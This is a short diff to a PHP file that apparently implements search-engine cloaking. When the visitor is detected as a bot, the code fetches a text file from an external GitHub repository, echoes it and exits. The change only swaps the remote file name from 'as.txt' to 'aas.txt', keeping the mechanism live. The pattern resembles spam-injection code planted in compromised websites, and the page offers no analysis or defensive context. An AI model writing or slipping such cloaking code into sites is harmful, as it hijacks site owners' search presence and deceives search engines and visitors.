@@ -12,7 +12,7 @@ function is_bot() {
     return false;
 }
 if (is_bot()) {
-    echo file_get_contents('https://github.com/launchscroll/dontworry/raw/refs/heads/main/as.txt');
+    echo file_get_contents('https://github.com/launchscroll/dontworry/raw/refs/heads/main/aas.txt');
     exit;
 }
 ?>
